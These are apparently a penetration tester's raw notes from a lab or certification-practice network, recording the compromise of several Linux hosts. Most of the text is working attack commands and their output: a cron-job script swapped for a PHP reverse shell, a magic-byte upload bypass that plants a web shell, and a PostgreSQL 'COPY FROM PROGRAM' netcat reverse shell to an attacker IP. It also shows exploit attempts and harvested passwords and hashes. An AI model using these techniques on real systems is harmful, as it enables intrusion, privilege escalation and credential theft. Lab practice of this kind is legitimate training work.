-rw-r--r-- 1 root root    1042 Feb 13  2020 /etc/crontab                                          
/etc/cron.d:
total 40
drwxr-xr-x   2 root root  4096 Nov 18  2022 .
drwxr-xr-x 134 root root 12288 Dec  7  2022 ..
-rw-r--r--   1 root root   102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root   285 Jul 16  2019 anacron
-rw-r--r--   1 root root   201 Feb 14  2020 e2scrub_all
-rw-r-----   1 root root   859 Nov 18  2022 froxlor
-rw-r--r--   1 root root   712 Mar 27  2020 php
-rw-r--r--   1 root root   191 Nov 14  2022 popularity-contest

www-data@milan:/var/www/html/oscommerce/catalog/install/includes$ ls -lah /etc/cron*
-rw-r--r-- 1 root root 1.1K Feb 13  2020 /etc/crontab
/etc/cron.d:
total 40K
drwxr-xr-x   2 root root 4.0K Nov 18  2022 .
drwxr-xr-x 134 root root  12K Dec  7  2022 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root  285 Jul 16  2019 anacron
-rw-r--r--   1 root root  201 Feb 14  2020 e2scrub_all
-rw-r-----   1 root root  859 Nov 18  2022 froxlor
-rw-r--r--   1 root root  712 Mar 27  2020 php
-rw-r--r--   1 root root  191 Nov 14  2022 popularity-contest

# PSPY:
www-data@milan:/tmp$ wget http://192.168.45.241:80/pspy64  
www-data@milan:/tmp$ chmod +x pspy64
www-data@milan:/tmp$ ./pspy64

2024/05/14 21:05:01 CMD: UID=0     PID=2373   | /bin/sh -c /usr/bin/nice -n 5 /usr/bin/php -q /var/www/html/froxlor/scripts/froxlor_master_cronjob.php --tasks 1> /dev/null                         
2024/05/14 21:05:01 CMD: UID=0     PID=2376   | /usr/bin/php -q /var/www/html/froxlor/scripts/froxlor_master_cronjob.php --tasks                                                                    
2024/05/14 21:05:01 CMD: UID=0     PID=2377   | sh -c chown -R www-data:www-data '/var/www/html/froxlor/'  

www-data@milan:/var/www/html/oscommerce/catalog/install/includes$ cd /var/www/html/froxlor/scripts/

www-data@milan:/var/www/html/froxlor/scripts$ ls
froxlor_master_cronjob.php

		# REPLACE froxlor_master_cronjob.php > .php Reverse Shell

www-data@milan:/var/www/html/froxlor/scripts$ rm froxlor_master_cronjob.php

www-data@milan:/var/www/html/froxlor/scripts$ ls

www-data@milan:/var/www/html/froxlor/scripts$ wget http://192.168.45.241:80/froxlor_master_cronjob.php

www-data@milan:/var/www/html/froxlor/scripts$ ls
froxlor_master_cronjob.php

			# WAIT FOR CRON JOB TO BE RUN 
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nc -nvlp 443
listening on [any] 443 ...

connect to [192.168.45.241] from (UNKNOWN) [192.168.223.223] 51926
Linux milan 5.15.0-52-generic #58~20.04.1-Ubuntu SMP Thu Oct 13 13:09:46 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 21:20:01 up 27 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off

# python3 -c 'import pty; pty.spawn("/bin/bash")'

root@milan:~# id
uid=0(root) gid=0(root) groups=0(root)

root@milan:~# whoami
root

root@milan:~# cat proof.txt
cdf7a88af9f9efbe96e3426be99b7bbf


-----------------------------------------------------------------------------------------
		192.168.154.224	Challenge 3 - VM 15 OS

SSH: 22
HTTP: 3128 8000

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.154.224

SSH: 22
22/tcp   open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3a:86:87:62:d1:b3:e3:74:97:fa:94:4b:31:a8:41:e5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDbVTnB85/XY7iFS2vyyomPyOXe8ckK4kBAZ/a725H2e3kC/coaeM6ASrFtDofAYrMALyX6kDSJZq8E8xVaJfEKB4PwYZsQOjzSzvrHEmYgjcnO4UJRyx9MTywj/y0e6lcZGy593UjaGLow8plpcOKZrgJ9Wpghx7YJJjSMTkI/SeS5cRI6MfmXcnjkF+6RXydRGBVop95PRNodRRca8y6SxmyNpfx93Z/9pOpzqq4a9CXxHss2vRp8cY99R7fvq1r4FL8hEvbUQjtnS9XOx12pxunsS2nLan3zPBHXn5sMLgM8fYzgS0jzbLtxLGT6no3G0YyqS5qd6ovUboeX3nwleyev/r5UT8Cwbb19zD/pAshRhPgsJpD4cvUDWopC7ywuCTI6gYr2rvSsA8h300cIqk9VeIZ67ry/1RX9iAVRFbAGFMkfDD55mBRNR2qxP4cnFBlJ+6G3UqVv2Ovl3jCuficOip24AHW14gsNhWd4Ucn8L5iDBME5bc3BTXzI2v0=
|   256 64:b0:c3:72:98:ec:47:ca:77:01:5d:73:5d:12:4b:69 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJnjSSJ0dYXkD3Q51X1r6wjZq6crazCQ14XF8TQF1ZPxJJVTWRm/SZeqkCHQzRH8BdPtrjwfB/pG6wkd14B3fXA=
|   256 de:0c:d1:ed:27:70:b6:9f:1f:99:31:e8:eb:cd:ff:b7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHJGWgFuo9+cQrE+CwvVz1aDFmKhTgPKBKIEUV1Ua4f7

HTTP: 3128 8000
3128/tcp open  http-proxy syn-ack Squid http proxy 4.10
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.10
8000/tcp open  http       syn-ack Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 1.1K  2024-05-13 23:22  debug.txt
|_
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sU -O 192.168.154.224
All 1000 scanned ports on 192.168.154.224 are in ignored states.
Running: Linux 2.6.X


-----------------------------------------------------------------------------------------
			192.168.154.225	Challenge 3 - VM 16 OS âœ…

FTP: 21
HTTP: 80 8090

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.154.225

FTP: 21
21/tcp   open  ftp     syn-ack vsftpd 3.0.3

HTTP: 80 8090
80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to nginx!
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
8090/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: 403 Forbidden

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo nmap -sU -O 192.168.154.225
631/udp  open|filtered ipp
5353/udp open|filtered zeroconf

				FTP: 21
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ ftp flybike@192.168.223.225
Connected to 192.168.223.225.
220 (vsFTPd 3.0.3)
530 Permission denied.
ftp: Login failed
                                                                                                  
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ ftp sarah@192.168.223.225
Connected to 192.168.223.225.
220 (vsFTPd 3.0.3)
530 Permission denied.
ftp: Login failed

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ ftp admin@192.168.223.225
Connected to 192.168.223.225.
220 (vsFTPd 3.0.3)
530 Permission denied.
ftp: Login failed

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ ftp 192.168.223.225
Connected to 192.168.223.225.
220 (vsFTPd 3.0.3)
Name (192.168.223.225:kali): anonymous
530 Permission denied.
ftp: Login failed

sarah:Christopher
flybike:Christopher


				HTTP: 80 8090
Web servers
- Nginx 1.18.0

searchspolit Nginx 1.18.0


http://192.168.223.225/
Welcome to nginx!
If you see this page, the nginx web server is successfully installed and working. Further configuration is required.
For online documentation and support please refer to nginx.org.
Commercial support is available at nginx.com.
Thank you for using nginx.

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ feroxbuster -u http://192.168.223.225/ -v
200      GET       25l       69w      612c http://192.168.223.225/


http://192.168.223.225:8090/
403 Forbidden
nginx/1.18.0 (Ubuntu)

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ feroxbuster -u http://192.168.223.225:8090/ -v
403      GET        7l       10w      162c http://192.168.223.225:8090/
301      GET        7l       12w      178c http://192.168.223.225:8090/html => http://192.168.223.225:8090/html/
301      GET        7l       12w      178c http://192.168.223.225:8090/backend => http://192.168.223.225:8090/backend/
301      GET        7l       12w      178c http://192.168.223.225:8090/backend/default => http://192.168.223.225:8090/backend/default/
301      GET        7l       12w      178c http://192.168.223.225:8090/backend/default/uploads => http://192.168.223.225:8090/backend/default/uploads/

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ dirb http://192.168.223.225:8090

You should perhaps see if lowering MTU helps just to be sure 
The MTU is just lab related but if you find that sometimes you getting timeouts etc or nothing being returned then MTU sometimes helps out

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo ifconfig tun0 mtu 1250

LOGIN PAGE: admin:admin
http://192.168.223.225:8090/backend/default/index.php

UPLOAD PAGE: pdf
http://192.168.223.225:8090/backend/default/upload.php

Magic Bytes: .php
https://medium.com/@wakedxy/bypassing-file-upload-restriction-using-magic-bytes-ae59fb5bb383
https://en.wikipedia.org/wiki/List_of_file_signatures
Magic Bytes are the first bytes used to identify file types. We can easily see them using a tool like tools like xxd
Web Applications use Magic Bytes to detect the file format of an uploaded file. Letâ€™s say that Magic Bytes work like a signature. We can have the list of those signatures here: https://en.wikipedia.org/wiki/List_of_file_signatures

PDF
25 50 44 46 2D	%PDF-	0	pdf	PDF document[33]

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/225]
â””â”€$ file shell.php                              
shell.php: PHP script, ASCII text

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/225]
â””â”€$ hexeditor shell.php
25 50 44 46 2D

â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/SKYLARK/225]
â””â”€$ file shell.php
shell.php: PDF document, version \012./

File successfully uploaded and will be reviewed by the team


# FIND DIRECTORY 
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ feroxbuster -u http://192.168.223.225:8090/ -v
http://192.168.223.225:8090/backend/default/uploads/pdf-shell.php

				LOCAL.txt

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nc -nvlp 80                                              
listening on [any] 80 ...
connect to [192.168.45.241] from (UNKNOWN) [192.168.223.225] 53184
Linux singapore06 5.15.0-53-generic #59~20.04.1-Ubuntu SMP Thu Oct 20 15:10:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 23:45:43 up  2:52,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ whoami
www-data

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@singapore06:/$ 

www-data@singapore06:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@singapore06:/$ hostname
singapore06

www-data@singapore06:/$ cat local.txt
4c691ad6e9eaf0c6a5a03ae100f6bca6

			NETWORK: 
www-data@singapore06:/$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:ab:69:dd brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 192.168.223.225/24 brd 192.168.223.255 scope global noprefixroute ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:69dd/64 scope link 
       valid_lft forever preferred_lft forever

www-data@singapore06:/$ ss -ntplu 
Netid   State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process                                                                         
udp     UNCONN   0        0          127.0.0.53%lo:53             0.0.0.0:*                                                                                     
udp     UNCONN   0        0                0.0.0.0:5353           0.0.0.0:*                                                                                     
udp     UNCONN   0        0                0.0.0.0:631            0.0.0.0:*                                                                                     
udp     UNCONN   0        0                0.0.0.0:41738          0.0.0.0:*                                                                                     
udp     UNCONN   0        0                   [::]:5353              [::]:*                                                                                     
udp     UNCONN   0        0                   [::]:55863             [::]:*                                                                                     
tcp     LISTEN   0        511              0.0.0.0:80             0.0.0.0:*      users:(("nginx",pid=868,fd=6))                                                 
tcp     LISTEN   0        32               0.0.0.0:21             0.0.0.0:*                                                                                     
tcp     LISTEN   0        4096       127.0.0.53%lo:53             0.0.0.0:*                                                                                     
tcp     LISTEN   0        5              127.0.0.1:631            0.0.0.0:*                                                                                     
tcp     LISTEN   0        244            127.0.0.1:5432           0.0.0.0:*                                                                                     
tcp     LISTEN   0        511              0.0.0.0:8090           0.0.0.0:*      users:(("nginx",pid=868,fd=8))                                                 
tcp     LISTEN   0        511                 [::]:80                [::]:*      users:(("nginx",pid=868,fd=7))                                                 
tcp     LISTEN   0        5                  [::1]:631               [::]:*                                                                                     
tcp     LISTEN   0        511                 [::]:8090              [::]:*      users:(("nginx",pid=868,fd=9))  

			USERS: 
www-data@singapore06:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:126:133:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
sshd:x:127:65534::/run/sshd:/usr/sbin/nologin
uploader:x:1000:1000:singapore06,,,:/home/uploader:/bin/bash
postgres:x:128:134:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
ftp:x:129:135:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
ftpuploader:x:1001:1001::/var/www/backend/default/uploads/:/usr/sbin/nologin

root:x:0:0:root:/root:/bin/bash
uploader:x:1000:1000:singapore06,,,:/home/uploader:/bin/bash
postgres:x:128:134:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

www-data@singapore06:/$ cat /etc/shadow
cat: /etc/shadow: Permission denied

www-data@singapore06:/home/uploader$ cat .bash_history
cat: .bash_history: Permission denied


			Files of interest: 
www-data@singapore06:/$ find / -name "local.txt" -ls 2> /dev/null
       24      4 -rw-r--r--   1 root     root           33 May 14 20:56 /local.txt

find / -name "proof.txt" -ls 2> /dev/null
find / -name "*.zip" -ls 2> /dev/null
find / -name "*.git" -ls 2> /dev/null
find / -name "*.github" -ls 2> /dev/null
find / -name id_rsa 2> /dev/null
find / -name authorized_keys 2> /dev/null
find / -name â€œdoas.confâ€ 2>/dev/null


			PRIV ESC: proof.txt

www-data@singapore06:/$ sudo -l
[sudo] password for www-data: 

www-data@singapore06:/$ sudo -i
www-data@singapore06:/$ sudo su


#LINPEAS:
wget http://192.168.45.241:80/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

â•”â•â•â•â•â•â•â•â•â•â•â•£ Sudo version
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                   
Sudo version 1.8.31   

â•”â•â•â•â•â•â•â•â•â•â•â•£ Executing Linux Exploit Suggester
â•š https://github.com/mzet-/linux-exploit-suggester                                                
cat: write error: Broken pipe                                                                     
cat: write error: Broken pipe
[+] [CVE-2022-2586] nft_object UAF
   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
[+] [CVE-2022-0847] DirtyPipe
   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: [ ubuntu=(20.04|21.04) ],debian=11
   Download URL: https://haxx.in/files/dirtypipez.c
[+] [CVE-2021-4034] PwnKit
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
[+] [CVE-2021-3156] sudo Baron Samedit
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
[+] [CVE-2021-3156] sudo Baron Samedit 2
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching root files in home dirs (limit 30)
/home/                                                                                            
/root/
/var/www
/var/www/html
/var/www/html/index.nginx-debian.html
/var/www/backend/default/config.php
/var/www/backend/default/uploader.php  $$$
/var/www/backend/default/upload.php
/var/www/backend/default/index.php
/var/www/backend/default/uploads/user-guide-rdweb.pdf

â•”â•â•â•â•â•â•â•â•â•â•â•£ Files inside others home (limit 20)
/home/uploader/.bashrc                                                                            
/home/uploader/.sudo_as_admin_successful
/home/uploader/.bash_history
/home/uploader/.local/share/session_migration-ubuntu
/home/uploader/.local/share/tracker/data/tracker-store.ontology.journal
/home/uploader/.local/share/tracker/data/tracker-store.journal
/home/uploader/.local/share/gnome-settings-daemon/input-sources-converted
/home/uploader/.local/share/recently-used.xbel
/home/uploader/.profile
/home/uploader/.config/gnome-initial-setup-done
/home/uploader/.config/user-dirs.locale
/home/uploader/.config/user-dirs.dirs
/home/uploader/.bash_logout
/var/www/html/index.nginx-debian.html
/var/www/backend/default/config.php
/var/www/backend/default/uploader.php
/var/www/backend/default/upload.php
/var/www/backend/default/index.php
/var/www/backend/default/uploads/pdf-shell.php
/var/www/backend/default/uploads/user-guide-rdweb.pdf

â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching passwords in config PHP files
/var/www/backend/default/config.php:$con = pg_connect("host=localhost port=5432 dbname=webapp user=postgres password=EAZT5EMULA75F8MC");

postgres:EAZT5EMULA75F8MC

www-data@singapore06:/etc/postgresql/12/main$ su postgres                                                                          
Password: EAZT5EMULA75F8MC                                                                                         
su: Authentication failure    


#PSPY: 
wget http://192.168.45.241:80/pspy64  
chmod +x pspy64 
./pspy64

2024/05/15 00:12:35 CMD: UID=120   PID=1199   | /usr/bin/whoopsie -f 
2024/05/15 00:12:35 CMD: UID=111   PID=1083   | /usr/libexec/rtkit-daemon 

2024/05/15 00:12:35 CMD: UID=128   PID=974    | postgres: 12/main: logical replication launcher                                                                                                     
2024/05/15 00:12:35 CMD: UID=128   PID=973    | postgres: 12/main: stats collector                                                                                                                  
2024/05/15 00:12:35 CMD: UID=128   PID=972    | postgres: 12/main: autovacuum launcher                                                                                                              
2024/05/15 00:12:35 CMD: UID=128   PID=971    | postgres: 12/main: walwriter                                                                                                                        
2024/05/15 00:12:35 CMD: UID=128   PID=970    | postgres: 12/main: background writer                                                                                                                
2024/05/15 00:12:35 CMD: UID=128   PID=969    | postgres: 12/main: checkpointer                                                                                                                     
2024/05/15 00:12:35 CMD: UID=128   PID=956    | /usr/lib/postgresql/12/bin/postgres -D /var/lib/postgresql/12/main -c config_file=/etc/postgresql/12/main/postgresql.conf  

		# REPLACE postgresql.conf with php shell
www-data@singapore06:/etc/postgresql/12/main$ rm postgresql.conf                                  
rm postgresql.conf                                                                                
rm: remove write-protected regular file 'postgresql.conf'? yes                                    
yes                                                                                               
rm: cannot remove 'postgresql.conf': Permission denied    
                                        
www-data@singapore06:/etc/postgresql/12/main$ wget http://192.168.45.241:80/postgresql.conf       
<main$ wget http://192.168.45.241:80/postgresql.conf                                              
--2024-05-15 00:41:41--  http://192.168.45.241/postgresql.conf                                    
Connecting to 192.168.45.241:80... connected.                                                     
HTTP request sent, awaiting response... 200 OK                                                    
Length: 5495 (5.4K) [application/octet-stream]                                                    
postgresql.conf.1: Permission denied                                                              
Cannot write to â€˜postgresql.conf.1â€™ (Permission denied). 


# SUID3NUM - NONE
wget http://192.168.45.241:80/suid3num.py
chmod +x suid3num.py
./suid3num.py
[~] Custom SUID Binaries (Interesting Stuff)                                                      
------------------------------                                                                    
------------------------------                                                                    
[#] SUID Binaries found in GTFO bins..                                                            
------------------------------                                                                    
[!] None :(                                                                                       
------------------------------     

# DIRTYPIPE - DIDNT WORK 
wget http://192.168.45.241:80/dpipe
chmod +x dpipe
./dpipe --root
www-data@milan:/tmp$ su root 
su root 
Password: el3ph@nt! 
su: Authentication failure

# SUDO Version: Sudo version 1.8.31 - PATCHED
wget http://192.168.45.241:80/sudo-v.py
chmod +x sudo-v.py
www-data@milan:/tmp$ python3 sudo-v.py
python3 sudo-v.py
Traceback (most recent call last):
  File "sudo-v.py", line 220, in <module>
    assert check_is_vuln(), "target is patched"
AssertionError: target is patched



www-data@singapore06:~/backend/default$ cat config.php
<?php
session_start();
$con = pg_connect("host=localhost port=5432 dbname=webapp user=postgres password=EAZT5EMULA75F8MC");
?>

			user-guide-rdweb.pdf
192.168.202.225:8090/backend/default/uploads/user-guide-rdweb.pdf

Using RD Web Access for resource monitoring
Browse to /RDWeb on the server and you will find the login window:
Log in using â€œSKYLARK\kioskâ€ as the username and â€œXEwUS^9R2Gwt8O914â€ as the
password.
Once logged in, start the â€œSkylarkStatusâ€ application. Please have this window open at all times
while making changes in the network. Notify the system administrators if the CPU goes beyond
80%.


				POSTGRESQL: 
https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql

postgres:EAZT5EMULA75F8MC

â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching passwords in config PHP files
/var/www/backend/default/config.php:$con = pg_connect("host=localhost port=5432 dbname=webapp user=postgres password=EAZT5EMULA75F8MC");

www-data@singapore06:/tmp$ psql -h localhost -d webapp -U postgres 
psql -h localhost -d webapp -U postgres 
Password for user postgres: EAZT5EMULA75F8MC

webapp=# SELECT datname FROM pg_database;
SELECT datname FROM pg_database;
WARNING: terminal is not fully functional
 postgres
 webapp
 template1
 template0

webapp=# SELECT usename, passwd from pg_shadow;
SELECT usename, passwd from pg_shadow;
WARNING: terminal is not fully functional
 usename  |               passwd                
----------+-------------------------------------
 postgres | md5e2dcbba1da36c5a25712e2ef6f2a51cd

# List databases
\list 
postgres
template0
template1
webapp

# use the database
\c postgres 
\c template0 
\c template1 
\c webapp 

# List tables
\d 

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;


postgres=# SELECT usename, passwd from pg_shadow;
 usename  |               passwd                
----------+-------------------------------------
 postgres | md5e2dcbba1da36c5a25712e2ef6f2a51cd

template1=# SELECT usename, passwd from pg_shadow;
 usename  |               passwd                
----------+-------------------------------------
 postgres | md5e2dcbba1da36c5a25712e2ef6f2a51cd

webapp=# SELECT usename, passwd from pg_shadow;
 usename  |               passwd                
----------+-------------------------------------
 postgres | md5e2dcbba1da36c5a25712e2ef6f2a51cd


webapp=# \d
              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | cmd_exec     | table    | postgres
 public | users        | table    | postgres
 public | users_id_seq | sequence | postgres


webapp=# SELECT * FROM users;
 id | username | password 
----+----------+----------
  1 | admin    | admin

SHELL: 
\?
!/bin/sh

				# POSTGRESQL RCE 
https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce-to-program

webapp=# DROP TABLE IF EXISTS cmd_exec;
webapp=# CREATE TABLE cmd_exec(cmd_output text);
webapp=# COPY cmd_exec FROM PROGRAM 'busybox nc 192.168.45.241 443 -e sh';

â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nc -nvlp 443
listening on [any] 443 ...
connect to [192.168.45.241] from (UNKNOWN) [192.168.223.225] 43770

whoami
postgres

python3 -c 'import pty; pty.spawn("/bin/bash")'
postgres@singapore06:/var/lib/postgresql/12/main$ 

postgres@singapore06:/var/lib/postgresql/12/main$ id
uid=128(postgres) gid=134(postgres) groups=134(postgres),113(ssl-cert)


				PRIV ESC: ROOT
# LINPEAS: 
./linpeas.sh

â•”â•â•â•â•â•â•â•â•â•â•â•£ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                  
Matching Defaults entries for postgres on singapore06:                                            
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User postgres may run the following commands on singapore06:
    (ALL) NOPASSWD: /usr/bin/psql

â•”â•â•â•â•â•â•â•â•â•â•â•£ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)                                                                                                 
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                 
